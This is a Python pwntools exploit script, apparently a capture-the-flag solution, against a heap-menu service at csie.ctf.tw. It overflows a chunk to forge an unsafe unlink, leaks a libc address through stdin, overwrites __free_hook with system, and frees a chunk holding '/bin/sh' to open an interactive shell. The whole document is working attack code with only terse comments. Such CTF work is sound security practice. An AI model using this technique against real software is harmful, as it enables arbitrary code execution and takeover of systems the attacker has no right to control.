from pwn import *

context.arch = 'amd64'

def new(sz,data):
    r.sendlineafter('> ','1')
    r.sendlineafter('size: ',str(sz))
    r.sendafter('content: ',data)

def prnt(idx):
    r.sendlineafter('> ','2')
    r.sendlineafter('index: ',str(idx))
    return r.recvline()[:-1]

def edt(idx,sz,data):
    r.sendlineafter('> ','3')
    r.sendlineafter('index: ',str(idx))
    r.sendlineafter('length: ',str(sz))
    r.sendafter('content: ',data)

def rmv(idx):
    r.sendlineafter('> ','4')
    r.sendlineafter('index: ',str(idx))

r = remote('csie.ctf.tw',10134)
###Useful Address
ptr2heap = 0x602040    #luckily 0x602030 has stdin_addr
stdin_offset = 0x3c38e0   #strange, why this one?
system_offset = 0x45390
free_hook_offset = 0x3c57a8

###Leak libc_base
new(0x98,'a')
new(0x98,'b')
new(0x98,'c')
edt(0,0x100,(p64(0)+p64(0x91)+p64(ptr2heap-0x18)+p64(ptr2heap-0x10)).ljust(0x90,b'\x00')+p64(0x90)+p64(0xa0))
rmv(1)
edt(0,8,'a'*8)
stdin_addr = u64(prnt(0)[8:].ljust(8,b'\x00'))
libc_base = stdin_addr-stdin_offset

###prepare pointer to free_hook
edt(0,0x100,p64(0)+p64(stdin_addr)+p64(0)+p64(libc_base+free_hook_offset))

###write free_hook to system
edt(0,0x100,p64(system_offset+libc_base))

###Write system argument
edt(2,0x100,b'/bin/sh\x00')

###Call system
rmv(2)

r.interactive()

